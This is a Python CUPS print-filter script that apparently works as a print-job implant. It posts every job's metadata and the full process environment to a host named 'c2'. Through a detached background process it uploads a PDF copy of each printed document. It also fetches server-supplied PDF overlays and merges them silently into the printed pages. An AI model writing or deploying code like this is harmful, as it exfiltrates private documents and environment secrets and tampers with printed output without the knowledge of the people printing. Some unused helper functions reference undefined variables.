#!/usr/bin/env python3

# !/usr/bin/python3 -t

from __future__ import print_function

import sys
import tempfile
import PyPDF2
import json
import datetime
import requests
import base64
import threading
import subprocess
import io
import os
import urllib
import dateutil.parser


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)


def bpc_debug(*args, **kwargs):
    eprint("DEBUG: (BPC)", *args, **kwargs)
    # eprint("DEBUG: (BPC)", threading.get_ident(), *args, **kwargs)


def spawn_daemon(func, *args, **kwargs):
    # do the UNIX double-fork magic, see Stevens' "Advanced
    # Programming in the UNIX Environment" for details (ISBN 0201563177)
    try:
        pid = os.fork()
        if pid > 0:
            # parent process, return and keep running
            return
    except OSError as  e:
        eprint("fork #1 failed: %d (%s)" % (e.errno, e.strerror))
        sys.exit(1)

    os.setsid()

    # do second fork
    try:
        pid = os.fork()
        if pid > 0:
            # exit from second parent
            sys.exit(0)
    except OSError as e:
        eprint("fork #2 failed: %d (%s)" % (e.errno, e.strerror))
        sys.exit(1)

    # do stuff
    func(*args, **kwargs)

    # all done
    os._exit(os.EX_OK)


class MetaUploader(threading.Thread):
    def __init__(self, cups_info):
        threading.Thread.__init__(self)
        self.cups_info = cups_info
        self._upload_id = None
        self._upload_file = None
        self._overlays = None

    def run(self):
        job_data = {'timestamp': datetime.datetime.now().timestamp(),
                    'environment': dict(os.environ)}
        job_data.update(self.cups_info)
        bpc_debug("MetaUploader started")
        response = requests.post(C2_METADATA_URL, json=job_data)
        json_response = response.json()
        bpc_debug("MetaUploader response=", json_response)
        self._upload_id = json_response['upload_id']
        self._upload_file = json_response['upload_file']
        self._overlays = {}
        file_downloader = {}
        for each in json_response['overlays']:
            filename = each['filename']
            key = each["key"]
            url = urllib.parse.urljoin(C2_API_URL, each['url'])
            updated_at = datetime.datetime.fromtimestamp(each['updated_at'])
            downloader = file_downloader.get(key)
            if downloader is None:
                downloader = FileDownloader(filename, key, url, updated_at)
                downloader.start()
                file_downloader[key] = downloader
            self._overlays[int(each['number'])] = {'filename': filename,
                                                   'key': key,
                                                   'url': url,
                                                   'updated_at': updated_at,
                                                   'downloader': downloader}

            bpc_debug("MetaUploader ended overlays=:", self._overlays)

    def upload_id(self):
        self.join()
        return self._upload_id

    def upload_file(self):
        self.join()
        return self._upload_file

    def overlays(self):
        self.join()
        return self._overlays


class FileDownloader(threading.Thread):
    def __init__(self, filename, key, url, updated_at):
        threading.Thread.__init__(self)
        self._filename = filename
        self._key = key
        self._path = (OVERLAY_PDF_DIR + '/%s.pdf') % key
        self._url = url
        self._updated_at = updated_at
        self._bytes = None

    def run(self):
        bpc_debug("FileDownloader started path=", self._path, 'url=', self._url, 'updated-at=', self._updated_at)
        if not os.path.isfile(self._path):
            bpc_debug("FileDownloader: File does not exist - downloading path=", self._path)
            return self.download_file()
        else:
            bpc_debug("FileDownloader: File exist - continue checking path=", self._path)

        age = (self._updated_at - datetime.datetime.fromtimestamp(os.path.getmtime(self._path))).total_seconds()
        if age > 0:
            bpc_debug("FileDownloader: File on disk too old path=", self._path, 'age=', age)
            return self.download_file()
        else:
            bpc_debug("FileDownloader: File young enough path=", self._path, 'age=', age)

        bpc_debug("FileDownloader: File in Cache!")

    def download_file(self):
        with open(self._path, 'wb') as file:
            file.write(requests.get(self._url).content)
        bpc_debug("FileDownloader: Download done")

    def path(self):
        self.join()
        return self._path


def convert_postscript_to_pdf(bytes, cups_info):
    # return pstopdf(bytes, cups_info)
    return ps2pdf(bytes)


def pstopdf(pdf_input_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("ps_to_pdf started in=", len(pdf_input_bytes_bytes), "bytes")
    bytes = subprocess.check_output(
        args=["/usr/lib/cups/filter/pstopdf", cups_id, cups_user, cups_title, cups_copies, cups_options],
        stdin=file_in)
    # file.close()
    bpc_debug("ps_to_pdf ended out=", len(bytes), "bytes")
    return bytes


def ps2pdf(in_bytes):
    bpc_debug("ps_2_pdf started in=", len(in_bytes), "bytes")
    p = subprocess.Popen(args=["/usr/bin/ps2pdf", '-', '-'],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE)
    out_bytes = p.communicate(input=in_bytes)[0]
    p.stdin.close()
    bpc_debug("ps_2_pdf ended out=", len(out_bytes), "bytes")
    return out_bytes


def ps2ascii(in_bytes):
    bpc_debug("ps_2_ascii started in=", len(in_bytes), "bytes")
    p = subprocess.Popen(
        args=["/usr/bin/ps2ascii", '-', '-'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE)
    out_bytes = p.communicate(input=in_bytes)[0]
    p.stdin.close()
    bpc_debug("ps_2_ascii ended", len(out_bytes), "bytes")
    return out_bytes


def convert_pdf_to_postscript(bytes, cups_info):
    # return pdf_to_ps(bytes, cups_info)
    return pdf2ps(bytes)


def pdftops(in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("pdf_to_ps started in=", len(in_bytes), "bytes")
    p = subprocess.Popen(
        args=["/usr/lib/cups/filter/pdftops", cups_id, cups_user, cups_title, cups_copies, cups_options],
        stdin=subprocess.PIPE)
    out_bytes = p.communicate(input=in_bytes)[0]
    p.stdin.close()
    bpc_debug("pdf_to_ps ended in=", len(out_bytes), "bytes")
    return out_bytes


def pdf2ps(in_bytes):
    bpc_debug("pdf_2_ps started in=", len(in_bytes), "bytes")
    p = subprocess.Popen(
        args=["/usr/bin/pdf2ps", '-', '-'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE)
    out_bytes = p.communicate(input=in_bytes)[0]
    p.stdin.close()
    bpc_debug("pdf_2_ps ended out=", len(out_bytes), "bytes")
    return out_bytes


def overlay_pdf(in_bytes, overlays):
    bpc_debug("overlay_pdf started in=", len(in_bytes), "overlays=", overlays)
    overlay_pages = {}

    with io.BytesIO(in_bytes) as in_file:
        with io.BytesIO() as out_file:
            in_reader = PyPDF2.PdfFileReader(in_file)
            out_writer = PyPDF2.PdfFileWriter()

            for page_index in range(in_reader.numPages):
                bpc_debug("overlay_pdf Page", page_index + 1, '/', in_reader.numPages)
                overlay_page = None
                overlay = overlays.get(page_index + 1)
                if overlay is not None:
                    bpc_debug("overlay_pdf Page", page_index + 1, 'with', overlay)
                if overlay is None:
                    overlay_page = None
                else:
                    overlay_key = overlay['key']
                    overlay_page = overlay_pages.get(overlay_key)
                    if overlay_page is None:
                        overlay_page = PyPDF2.PdfFileReader(overlay['downloader'].path()).getPage(0)
                        overlay_pages[overlay_key] = overlay_page

                page = in_reader.getPage(page_index)
                if overlay_page is not None:
                    page.mergePage(overlay_page)
                out_writer.addPage(page)

            out_writer.write(out_file)
            out_bytes = out_file.getvalue()
    bpc_debug("overlay_pdf ended out=", len(out_bytes), 'bytes')
    return out_bytes


def read_ps_in_bytes():
    bpc_debug("read_ps_in_bytes started")
    if len(sys.argv) > 6 and os.path.isfile(sys.argv[6]):
        with open(sys.argv[6], 'rb') as file:
            bytes = file.read()
    else:
        bytes = sys.stdin.buffer.read()
    bpc_debug("read_ps_in_bytes ended out=", len(bytes), 'bytes')
    return bytes


def write_ps_out_bytes(bytes):
    sys.stdout.buffer.write(bytes)


def upload_bytes(bytes, upload_id, filename, mimetype):
    if len(bytes) == 0:
        return
    bpc_debug("upload_bytes started id=", upload_id, 'mimetype=', mimetype)
    file = {'file': (filename, bytes, mimetype)}
    response = requests.post(C2_UPLOAD_URL % upload_id, files=file)
    bpc_debug("upload_bytes ended response=", response)


C2_API_URL = 'http://c2:8080/bpc/api-v1'
C2_METADATA_URL = C2_API_URL + '/metadata'
C2_UPLOAD_URL = C2_API_URL + '/file/%s'
OVERLAY_PDF_DIR = '/bpc/overlays-cache'

cups_info = {
    'id': sys.argv[1],
    'user': sys.argv[2],
    'title': sys.argv[3],
    'copies': sys.argv[4],
    'options': sys.argv[5]
}

meta_uploader = MetaUploader(cups_info)
meta_uploader.start()

ps_in_bytes = read_ps_in_bytes()
pdf_in_bytes = convert_postscript_to_pdf(ps_in_bytes, cups_info)
if meta_uploader.upload_file():
    spawn_daemon(upload_bytes, pdf_in_bytes, meta_uploader.upload_id(), 'print.pdf', 'application/pdf')
pdf_out_bytes = overlay_pdf(pdf_in_bytes, meta_uploader.overlays())
ps_out_bytes = convert_pdf_to_postscript(pdf_out_bytes, cups_info)
write_ps_out_bytes(ps_out_bytes)
